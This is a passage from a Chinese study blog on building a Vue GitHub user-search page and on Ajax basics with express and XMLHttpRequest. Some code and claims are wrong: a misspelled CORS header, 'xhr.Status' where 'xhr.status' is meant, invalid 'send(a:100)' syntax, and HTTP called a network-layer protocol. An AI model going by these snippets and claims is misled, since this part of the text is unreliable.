)<br></code></pre></td></tr></table></figure><p>我们需要走代理的时候就加上代理前缀：比如<code>/api/students</code></p><h2 id="GitHub搜索实例"><a href="#GitHub搜索实例" class="headerlink" title="GitHub搜索实例"></a>GitHub搜索实例</h2><p>我们现在要求一个搜索页面，能够搜索GitHub上面的用户：</p><p><img src="https://s2.loli.net/2022/05/03/Hr365bxANE7theT.png" alt="GitHub案例.png"></p><p>上面的搜索框我们在Search组件中实现，下面的显示我们在List组件中实现。</p><p>对于具体的样式和html部分不再赘述。</p><h3 id="首先看Search的搜索框部分："><a href="#首先看Search的搜索框部分：" class="headerlink" title="首先看Search的搜索框部分："></a>首先看Search的搜索框部分：</h3><p>首先需要双向绑定一个keyWord，用于记录我们的搜索值</p><p>需要给GitHub发送请求，GitHub中有一个专门的搜索网址：<a href="https://api.github.com/search/users?q=xxx">https://api.github.com/search/users?q=xxx</a>，我们利用ajax发送请求。</p><p>将收到的数据返还给List组件，这里需要用到全局事件总线</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript">      <span class="hljs-comment">//input框</span><br>      &lt;div&gt;<br>        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;enter the name you search&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>/&gt;</span></span>&amp;nbsp;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>              @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;searchUsers&quot;</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>      &lt;/div&gt;<br> <span class="hljs-comment">//vue部分</span><br> <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">keyWord</span>:<span class="hljs-string">&#x27;&#x27;</span><br>    &#125;<br>&#125;,<br><span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-function"><span class="hljs-title">searchUsers</span>(<span class="hljs-params"></span>)</span>&#123;<br>        axios.get(<span class="hljs-string">`https://api.github.com/search/users?q=<span class="hljs-subst">$&#123;<span class="hljs-built_in">this</span>.keyWord&#125;</span>`</span>).then(<span class="hljs-comment">//模板字符串实现字符串的插值功能</span><br>            <span class="hljs-function"><span class="hljs-params">response</span>=&gt;</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;请求成功了&#x27;</span>,response.data.items)<span class="hljs-comment">//得到一堆用户</span><br>                <span class="hljs-built_in">this</span>.$bus.$emit(<span class="hljs-string">&#x27;getUsers&#x27;</span>,response.data.items)<span class="hljs-comment">//全局事件总线移交数据</span><br>            &#125;,<br>            <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;请求失败了&#x27;</span>,error.message)<br>            &#125;<br>        )<br>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="然后是List显示部分："><a href="#然后是List显示部分：" class="headerlink" title="然后是List显示部分："></a>然后是List显示部分：</h3><p>在List部分，我们首先需要的是一个v-for循环以产生多个用户框。</p><p>然后是使用全局事件总线接收Search传过来的数据，并在v-for中显示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//template部分</span><br>&lt;!-- v-<span class="hljs-keyword">for</span>实现遍历 --&gt;<br>      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;user in users&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;user.login&quot;</span>&gt;</span></span><br><span class="xml">          <span class="hljs-comment">&lt;!--用户地址 --&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;user.html_url&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;user.avatar_url&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#x27;width: 100px&#x27;</span>/&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card-text&quot;</span>&gt;</span>&#123;&#123;user.login&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br> <span class="hljs-comment">//vue部分</span><br> <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">users</span>:[<br>            &#123;&#125;<br>        ]<br>    &#125;<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.$bus.$on(<span class="hljs-string">&#x27;getUsers&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">users</span>)=&gt;</span>&#123;<br>        <span class="hljs-comment">// console.log(users);</span><br>        <span class="hljs-built_in">this</span>.users = users<span class="hljs-comment">//收到数据，存在自身</span><br>    &#125;)<br>&#125;,<br></code></pre></td></tr></table></figure><h3 id="样例拓展："><a href="#样例拓展：" class="headerlink" title="样例拓展："></a>样例拓展：</h3><p>如果我们需要加入一些过渡效果，比如显示 欢迎词 和 加载中，我们应该怎么做呢？</p><p>思路：<br>首先想到的肯定是通过 v-show 来控制显示或者隐藏，但是这个导致的结果就是=&gt;我们需要增加很多元素来帮助我们控制这些标签的显示</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">isFirst:</span> <span class="hljs-literal">true</span>,<br><span class="hljs-symbol">isLoading:</span> <span class="hljs-literal">false</span>,<br><span class="hljs-symbol">errMsg:</span> <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-symbol">users:</span> [],<br></code></pre></td></tr></table></figure><p>而且这些变量的改变是在另外一个标签<code>Search</code>中，那么我们的全局事件总线就会变得非常的冗杂。</p><p>于是我们决定改造我们在全局事件总线中传递的参数：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//将冗杂的数据封装成一个数组</span><br><span class="hljs-keyword">data</span>() &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      dataObj: &#123;<br>        isFirst: <span class="hljs-literal">true</span>,<br>        isLoading: <span class="hljs-literal">false</span>,<br>        errMsg: <span class="hljs-string">&quot;&quot;</span>,<br>        users: [],<br>      &#125;,<br>    &#125;;<br>  &#125;,<br>  <br><span class="hljs-comment">//Search中传递对象</span><br><span class="hljs-keyword">this</span>.$bus.$emit(<span class="hljs-string">&#x27;updateList&#x27;</span>,&#123;isFirst:<span class="hljs-literal">false</span>,isLoading:<span class="hljs-literal">true</span>,errMsg:<span class="hljs-string">&#x27;&#x27;</span>,users:[]&#125;)<br><br><span class="hljs-comment">//List中接收对象并使用es6语法比较替换</span><br>mounted() &#123;<br>    <span class="hljs-keyword">this</span>.$bus.$on(<span class="hljs-string">&quot;updateList&quot;</span>, (dataObj) =&gt; &#123;<br>      <span class="hljs-comment">// console.log(users);</span><br>      <span class="hljs-keyword">this</span>.dataObj = &#123;...<span class="hljs-keyword">this</span>.dataObj,...dataObj&#125;<span class="hljs-comment">//es6语法&#123;...x&#125;重名的以后面为主</span><br>    &#125;);<br>  &#125;,<br></code></pre></td></tr></table></figure><p>这样便实现了我们事件总线的优化，避免事件总线的变量变得太过冗杂，使得变量的语义化更加明显。</p>]]></content>
    
    
    <categories>
      
      <category>Ajax</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ajax</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ajax</title>
    <link href="/2022/04/30/Ajax/"/>
    <url>/2022/04/30/Ajax/</url>
    
    <content type="html"><![CDATA[<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="1-Ajax简介"><a href="#1-Ajax简介" class="headerlink" title="1.Ajax简介"></a>1.Ajax简介</h2><p>Ajax实现的是我们网页在不刷新时，发送http请求，也就是<strong>有用则加载，不用就不加载</strong></p><p>它的优点是：1.不刷新实现请求，2.更新部分页面内容</p><p>​        缺点是：1.没有浏览历史，不能回退，2.有跨域问题，3.对于SEO（搜索引擎优化）不友好，比如爬虫</p><p>而它在传输数据时，使用的语言，之前是XML（一种类似HTML但是没有预定义标签的传输和储存方式），进化到现在使用的便是JSON</p><h2 id="2-http报文"><a href="#2-http报文" class="headerlink" title="2.http报文"></a>2.http报文</h2><p>http协议是网络层上的协议，实现客户机服务器数据交互而存在，它有两种类型的报文：</p><h3 id="（1）-请求报文"><a href="#（1）-请求报文" class="headerlink" title="（1）.请求报文"></a>（1）.请求报文</h3><p><img src="https://s2.loli.net/2022/05/03/WQxFRuGhKTngSvp.png" alt="http请求报文.png"></p><p>注意的是：报文头的格式，空行用于分割报文头和报文体，报文体在POST下是不为空的，在GET下是为空的（POST和GET都是请求方式）</p><h3 id="（2）-响应报文"><a href="#（2）-响应报文" class="headerlink" title="（2）.响应报文"></a>（2）.响应报文</h3><p><img src="https://s2.loli.net/2022/05/03/4aLxr5AUydKk8bi.png" alt="http响应报文.png"></p><p>响应报文同样需要注意 报文头部，空行和报文体，这里的报文体返回的是服务器的数据，例如我们的html代码</p><h3 id="（3）-NetWork"><a href="#（3）-NetWork" class="headerlink" title="（3）.NetWork"></a>（3）.NetWork</h3><p>我们在浏览器控制台中会有一个NetWork选项：（这里的请求报文是GET类型，所以没有报文体）</p><p><img src="https://s2.loli.net/2022/05/03/jXSI68hposJFv7V.png" alt="network选项.png"></p><p>进入一个网页点开便是我们发送的所有请求（如果没有就刷新一下），在左侧的Name栏点击第一个文件，Header下的Request Header就是我们请求报文的报文头，Response Header便是我们响应报文的报文头。</p><p>那么报文体在哪里呢？报文体在我们的Response选项中，得到的就是我们响应报文的报文体。如果我们发送的是POST请求报文，那它的报文体就在：</p><p><img src="https://s2.loli.net/2022/05/03/AePl9E8Z6XGz74J.png" alt="POST报文的报文体.png"></p><p>Header下的From Data属性中。</p><h2 id="3-express框架"><a href="#3-express框架" class="headerlink" title="3.express框架"></a>3.express框架</h2><h3 id="（1）-安装express"><a href="#（1）-安装express" class="headerlink" title="（1）.安装express"></a>（1）.安装express</h3><p>express框架是基于node.js 的，所以我们在安装express之前需要先安装node.js。安装完后，我们新建一个文件</p><p>在控制台输入<code>npm i express</code>这样我们就可以安装express。</p><p>接下来我们写第一个ajax代码：（代码大致分为四个部分）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//1.引入express</span><br><span class="hljs-keyword">const</span> &#123; response &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-comment">//2.创建应用对象</span><br><span class="hljs-keyword">const</span> app = express();<br><br><span class="hljs-comment">//3.创建路由规则,request是对请求报文的封装，response是对响应报文的封装</span><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">request, response</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">//设置响应</span><br>    response.send(<span class="hljs-string">&#x27;hello express&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">//4.监听端口</span><br>app.listen(<span class="hljs-number">8000</span>,<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;服务已经启动，8000端口监听&quot;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>接下来我们在控制台输入<code>node 文件名</code>就可以在8000端口看到我们的页面了。</p><h3 id="（2）-模拟服务器"><a href="#（2）-模拟服务器" class="headerlink" title="（2）.模拟服务器"></a>（2）.模拟服务器</h3><p>实现模拟我们需要两个代码，一个是我们的前端代码，一个是我们的服务器代码。</p><p>我们先看才学习的服务器代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//1.引入express</span><br><span class="hljs-keyword">const</span> &#123; response &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-comment">//2.创建应用对象</span><br><span class="hljs-keyword">const</span> app = express();<br><br><span class="hljs-comment">//server是路径</span><br>app.get(<span class="hljs-string">&#x27;/server&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">request, response</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">//设置响应头，设置允许跨域</span><br>    response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Orgin&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>);<br>    <span class="hljs-comment">//设置响应</span><br>    response.send(<span class="hljs-string">&#x27;hello AJAX&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">//4.监听端口</span><br>app.listen(<span class="hljs-number">8000</span>,<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;服务已经启动，8000端口监听&quot;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>和之前的变化不大，改变了一个<code>/server</code>,是路径名，也就是这个服务器在8000的<code>./sever</code>下 =》 <code>http://localhost:8000/server</code></p><p>然后是前端代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AJAX GET 请求<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"></span><br><span class="css">        <span class="hljs-selector-id">#result</span> &#123;</span><br><span class="css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><br><span class="css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;</span><br><span class="css">            <span class="hljs-attribute">border</span>: solid <span class="hljs-number">1px</span> <span class="hljs-number">#90b</span>;</span><br><span class="css">        &#125;</span><br><span class="css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>点击发送请求<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-keyword">const</span> btn = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&quot;button&quot;</span>);</span><br><span class="javascript">        btn.onclick = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//点击事件</span></span><br><span class="javascript">            <span class="hljs-comment">//1.创建对象</span></span><br><span class="javascript">            <span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">            <span class="hljs-comment">//2.初始化请求方式和url</span></span><br><span class="javascript">            xhr.open(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://localhost:8000/server&#x27;</span>);</span><br><span class="javascript">            <span class="hljs-comment">//3.发送</span></span><br><span class="javascript">            xhr.send();</span><br><span class="javascript">            <span class="hljs-comment">//4.事件绑定</span></span><br><span class="javascript">            xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">                <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span>) &#123;<span class="hljs-comment">//说明返回来所有结果   </span></span><br><span class="javascript">                    <span class="hljs-keyword">if</span> (xhr.Status &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.Status &lt; <span class="hljs-number">300</span>) &#123;<span class="hljs-comment">//状态码正常</span></span><br><span class="javascript">                        <span class="hljs-built_in">console</span>.log(xhr.statusText);</span><br><span class="javascript">                        <span class="hljs-built_in">console</span>.log(xhr.getAllResponseHeaders());</span><br><span class="javascript">                        <span class="hljs-built_in">console</span>.log(xhr.response);</span><br><span class="javascript">                    &#125;</span><br><span class="javascript">                &#125;</span><br><span class="javascript">            &#125;</span><br><span class="javascript">        &#125;</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>需要注意的是script部分的四个步骤，主要是事件绑定中的两个判断，是对于响应报文的两个判断，在一切正常之后我们就可以得到响应报文的各个部分。</p><h3 id="（3）-设置url参数"><a href="#（3）-设置url参数" class="headerlink" title="（3）.设置url参数"></a>（3）.设置url参数</h3><p>在URL中的参数，我们通过?和&amp;设置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xhr</span>.open(&#x27;GET&#x27;, &#x27;http://localhost:<span class="hljs-number">8000</span>/server?a=<span class="hljs-number">100</span>&amp;b=<span class="hljs-number">200</span>&amp;c=<span class="hljs-number">300</span>&#x27;);<br></code></pre></td></tr></table></figure><p>这里便是配置了a,b,c三个参数，参数与地址之间用问号做分割，参数与参数之间用&amp;做分割。</p><p>我们的参数设置成功之后就可以在<code>Network</code>中的<code>Payload</code>中参看</p><h3 id="（4）-发送post请求"><a href="#（4）-发送post请求" class="headerlink" title="（4）.发送post请求"></a>（4）.发送post请求</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">result.addEventListener(<span class="hljs-string">&quot;mouseover&quot;</span>, <span class="hljs-keyword">function</span> () &#123;<br>            <span class="hljs-regexp">//</span><span class="hljs-number">1</span>.创建对象<br>            const xhr = new XMLHttpRequest();<br>            <span class="hljs-regexp">//</span><span class="hljs-number">2</span>.初始化请求方式和url<br>            xhr.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://localhost:8000/server&#x27;</span>);<br>            <span class="hljs-regexp">//</span><span class="hljs-number">3</span>.发送<br>            xhr.send();<br>            <span class="hljs-regexp">//</span><span class="hljs-number">4</span>.事件绑定<br>            xhr.onreadystatechange = <span class="hljs-keyword">function</span> () &#123;<br>                <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span>) &#123;<span class="hljs-regexp">//</span>说明返回来所有结果   <br>                    <span class="hljs-keyword">if</span> (xhr.Status &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.Status &lt; <span class="hljs-number">300</span>) &#123;<span class="hljs-regexp">//</span>状态码正常<br>                        <span class="hljs-regexp">//</span>获取response<br>                        result.innerHTML = xhr.response;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;)<br></code></pre></td></tr></table></figure><p>对于post请求，我们需要将 .open 选项的第一个参数改为 POST，表示这个是post类型的报文。</p><p>因为我们post可以发送<strong>请求体</strong>，所以我们可以在send()中加入参数<strong>send(a:100)或者send(a=100)或者JSON格式</strong></p><p>然后在服务器端：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>post请求<br>app.post(<span class="hljs-string">&#x27;/server&#x27;</span>, (request, response) =&gt; &#123;<br>    <span class="hljs-regexp">//</span>设置响应头，设置允许跨域<br>    response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>);<br>    <span class="hljs-regexp">//</span>设置响应<br>    response.send(<span class="hljs-string">&#x27;hello AJAX post&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>增加这个代码，设置对于post请求的返回。</p><h3 id="（5）-设置请求头"><a href="#（5）-设置请求头" class="headerlink" title="（5） .设置请求头"></a>（5） .设置请求头</h3><p>我们可以使用<code>setRequestHeader</code>设置请求头。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//设置请求头</span><br>xhr.set<span class="hljs-constructor">RequestHeader(&#x27;Content-Type&#x27;,&#x27;<span class="hljs-params">application</span><span class="hljs-operator">/</span><span class="hljs-params">x</span>-<span class="hljs-params">www</span>-<span class="hljs-params">form</span>-<span class="hljs-params">urlencoded</span>&#x27;)</span>;<br><span class="hljs-comment">//自定义请求头</span><br>xhr.set<span class="hljs-constructor">RequestHeader(&#x27;<span class="hljs-params">name</span>&#x27;,&#x27;<span class="hljs-params">ajax</span>&#x27;)</span>;<br></code></pre></td></tr></table></figure><p>但是对于自定义请求头，服务器端需要申明接收</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">app.all(<span class="hljs-string">&#x27;/server&#x27;</span>, (request, response) =&gt; &#123;<br>    <span class="hljs-regexp">//</span>设置响应头，设置允许跨域<br>    response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>);<br>    <span class="hljs-regexp">//</span>接收自定义请求头<br>    response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>);<br>    <span class="hljs-regexp">//</span>设置响应<br>    response.send(<span class="hljs-string">&#x27;hello AJAX&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>1.需要改变接收类型为all，表示接收所有类型的请求头</p><p>2.需要在setHeader中添加接收同意<code>response.setHeader(&#39;Access-Control-Allow-Headers&#39;,&#39;*&#39;);</code></p><p>这样我们的自定义请求头也不会报错了！</p><h3 id="（6）-JSON-转换"><a href="#（6）-JSON-转换" class="headerlink" title="（6）.JSON 转换"></a>（6）.JSON 转换</h3><p>在服务端发送数据的时候，<code>response.send()</code>中的数据必须是字符串类型的数据，所以在我们传输数据的时候就需要调动JSON。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.all(<span class="hljs-string">&#x27;/JSON-server&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">request, response</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data=&#123;<br>        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;swpu&#x27;</span><br>    &#125;;<br>    <span class="hljs-comment">//将要送的对象转换为字符串</span><br>    <span class="hljs-keyword">let</span> str= <span class="hljs-built_in">JSON</span>.stringify(data);<br>    <span class="hljs-comment">//设置响应头，设置允许跨域</span><br>    response.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>);<br>    <span class="hljs-comment">//send只能送字符串</span><br>    